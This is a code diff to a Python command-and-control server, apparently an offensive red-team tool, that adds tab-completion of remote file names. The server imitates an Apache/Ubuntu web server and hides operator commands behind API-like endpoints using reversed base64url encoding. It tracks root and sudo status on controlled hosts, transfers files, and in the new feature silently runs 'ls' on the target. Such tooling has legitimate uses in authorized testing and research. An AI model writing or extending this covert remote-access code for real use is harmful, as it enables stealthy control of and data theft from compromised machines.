@@ -15,8 +15,11 @@ from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 supersu = False
+remote_files = []
+last_prompt = None
 cmd_response = True
 sudo = False ; root = False
+autocomplete_pending = False
 command = None ; prompt = None
 local_path = None ; remote_path = None
 first_run = True ; wait_for_cmd = False
@@ -32,6 +35,16 @@ banner = r"""
 banner2 = """                                               
   ---------------- by @JoelGMSec -----------------
 """
+
+def completer(text, state):
+    global remote_files
+    options = [f for f in remote_files if f.startswith(text)]
+
+    if len(options) == 1:
+        return options[state]
+
+readline.set_completer(completer)
+readline.parse_and_bind("tab: complete")
 
 class MyServer(BaseHTTPRequestHandler):
     def _set_headers(self, code=200):
@@ -84,7 +97,8 @@ class MyServer(BaseHTTPRequestHandler):
         global cmd_response
         global wait_for_cmd ; global root
         global prompt ; global first_run ; global sudo
-        global local_path ; global remote_path ; global command 
+        global local_path ; global remote_path ; global command
+        global remote_files ; global last_prompt ; global autocomplete_pending
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -101,6 +115,17 @@ class MyServer(BaseHTTPRequestHandler):
                     print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
 
             elif self.path == "/api/v1/Client/Token":
+                if prompt != last_prompt and not autocomplete_pending:
+                    last_prompt = prompt
+                    remote_files = []
+                    autocomplete_pending = True
+                    command = "ls"
+                    encoded_command = "Token: "
+                    encoded_command += self.encode_reversed_base64url(command)
+                    self._set_headers()
+                    self.wfile.write(encoded_command.encode("utf-8"))
+                    return first_run, command, wait_for_cmd, sudo, root, cmd_response
+
                 if root:
                     whoami = "root"
                 else:
@@ -227,6 +252,9 @@ class MyServer(BaseHTTPRequestHandler):
                         cmd_response = False
                         first_run = False
 
+                        if "cd " in command:
+                            last_prompt = None
+
                         if root and not "cd" in command:
                             if not wait_for_cmd and not "exit" in command:
                                 if supersu:
@@ -277,7 +305,8 @@ class MyServer(BaseHTTPRequestHandler):
         global cmd_response
         global wait_for_cmd ; global root
         global prompt ; global first_run ; global sudo
-        global local_path ; global remote_path ; global command 
+        global local_path ; global remote_path ; global command
+        global remote_files ; global autocomplete_pending
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -309,7 +338,13 @@ class MyServer(BaseHTTPRequestHandler):
                     print(colored(f"[!] Error downloading \"{remote_path}\" file!", "red"))
 
             elif self.path == "/api/v1/Client/Debug":
-                if not first_run and command is not None:
+                if autocomplete_pending:
+                    if decoded_payload:
+                        remote_files = decoded_payload.strip().split("\n")
+                        remote_files = [f.strip() for f in remote_files if f.strip()]
+                    autocomplete_pending = False
+                    cmd_response = True
+                elif not first_run and command is not None:
                     cmd_response = True
                     if decoded_payload == "" or not decoded_payload:
                         print()
@@ -337,7 +372,11 @@ class MyServer(BaseHTTPRequestHandler):
                 self.wfile.write(response.encode())
 
             elif self.path == "/api/v1/Client/Error":
-                if not first_run and command is not None:
+                if autocomplete_pending:
+                    remote_files = []
+                    autocomplete_pending = False
+                    cmd_response = True
+                elif not first_run and command is not None:
                     cmd_response = True
                     if decoded_payload == "" or not decoded_payload:
                         print()
